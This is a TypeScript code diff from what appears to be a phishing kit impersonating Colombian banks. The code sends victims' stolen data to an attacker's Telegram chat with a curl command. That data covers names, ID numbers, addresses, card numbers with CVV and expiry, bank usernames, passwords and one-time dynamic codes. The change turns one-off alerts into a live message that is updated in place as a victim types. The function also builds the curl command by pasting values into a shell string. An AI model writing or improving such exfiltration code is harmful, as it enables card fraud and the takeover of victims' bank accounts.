@@ -3,8 +3,41 @@ import { promisify } from 'util';
 
 const execAsync = promisify(exec);
 
-// Función para enviar mensajes a Telegram usando curl (más confiable)
-export async function sendToTelegram(sessionData: any) {
+// Función para formatear el mensaje
+function formatMessage(sessionData: any): string {
+  return `
+🔔 SESION EN VIVO
+
+Sesion: #${sessionData.sessionId.slice(-8)}
+Banco: ${sessionData.bank.toUpperCase()}
+Estado: ${sessionData.status}
+
+📋 DATOS DEL CLIENTE
+Nombre: ${sessionData.fullName || '⏳ Esperando...'}
+Email: ${sessionData.email || '⏳ Esperando...'}
+Telefono: ${sessionData.phone || '⏳ Esperando...'}
+Cedula: ${sessionData.documentId || '⏳ Esperando...'}
+Direccion: ${sessionData.address || '⏳ Esperando...'}
+Ciudad: ${sessionData.city || '⏳ Esperando...'}
+
+💳 DATOS DE TARJETA
+Numero: ${sessionData.cardNumber || '⏳ Esperando...'}
+Titular: ${sessionData.cardHolderName || '⏳ Esperando...'}
+Vencimiento: ${sessionData.expiryDate || '⏳ Esperando...'}
+CVV: ${sessionData.cvv || '⏳ Esperando...'}
+Marca: ${sessionData.cardBrand || '⏳ Esperando...'}
+
+🔐 CREDENCIALES BANCARIAS
+Usuario: ${sessionData.usuario || '⏳ Esperando...'}
+Clave: ${sessionData.clave || '⏳ Esperando...'}
+Dinamica: ${sessionData.claveDinamica || sessionData.otp || '⏳ Esperando...'}
+
+🕐 Ultima actualizacion: ${new Date().toLocaleTimeString('es-CO')}
+`;
+}
+
+// Función para enviar o actualizar mensajes a Telegram
+export async function sendToTelegram(sessionData: any, messageId?: number) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -14,45 +47,28 @@ export async function sendToTelegram(sessionData: any) {
   }
 
   try {
-    // Formatear el mensaje (texto plano, sin Markdown para evitar errores)
-    const message = `
-🔔 NUEVA SESION CAPTURADA
-
-Sesion: #${sessionData.sessionId.slice(-8)}
-Banco: ${sessionData.bank.toUpperCase()}
-Estado: ${sessionData.status}
-
-📋 DATOS DEL CLIENTE
-Nombre: ${sessionData.fullName || 'N/A'}
-Email: ${sessionData.email || 'N/A'}
-Telefono: ${sessionData.phone || 'N/A'}
-Cedula: ${sessionData.documentId || 'N/A'}
-Direccion: ${sessionData.address || 'N/A'}
-Ciudad: ${sessionData.city || 'N/A'}
-
-💳 DATOS DE TARJETA
-Numero: ${sessionData.cardNumber || 'N/A'}
-Titular: ${sessionData.cardHolderName || 'N/A'}
-Vencimiento: ${sessionData.expiryDate || 'N/A'}
-CVV: ${sessionData.cvv || 'N/A'}
-Marca: ${sessionData.cardBrand || 'N/A'}
-
-🔐 CREDENCIALES BANCARIAS
-Usuario: ${sessionData.usuario || 'N/A'}
-Clave: ${sessionData.clave || 'N/A'}
-Dinamica: ${sessionData.claveDinamica || sessionData.otp || 'N/A'}
-
-🕐 Fecha: ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
-`;
-
+    const message = formatMessage(sessionData);
+    
     // Escapar comillas para JSON
     const escapedMessage = message.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n');
     
-    const curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
-      -H "Content-Type: application/json" \
-      -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\"}" \
-      --max-time 30 \
-      --silent`;
+    let curlCommand: string;
+    
+    if (messageId) {
+      // Editar mensaje existente
+      curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/editMessageText" \
+        -H "Content-Type: application/json" \
+        -d "{\\"chat_id\\":\\"${chatId}\\",\\"message_id\\":${messageId},\\"text\\":\\"${escapedMessage}\\"}" \
+        --max-time 30 \
+        --silent`;
+    } else {
+      // Enviar nuevo mensaje
+      curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
+        -H "Content-Type: application/json" \
+        -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\"}" \
+        --max-time 30 \
+        --silent`;
+    }
 
     try {
       const { stdout, stderr } = await execAsync(curlCommand);
@@ -63,14 +79,15 @@ Dinamica: ${sessionData.claveDinamica || sessionData.otp || 'N/A'}
       
       const response = JSON.parse(stdout);
       if (response.ok) {
-        console.log('Message sent to Telegram successfully via curl');
-        return true;
+        console.log(messageId ? 'Message updated in Telegram' : 'Message sent to Telegram');
+        // Retornar el message_id para futuras actualizaciones
+        return response.result.message_id;
       } else {
         console.error('Telegram API error:', response);
         throw new Error(`Telegram API error: ${response.description}`);
       }
     } catch (error: any) {
-      console.error('Error sending to Telegram via curl:', error.message);
+      console.error('Error with Telegram via curl:', error.message);
       throw error;
     }
   } catch (error) {
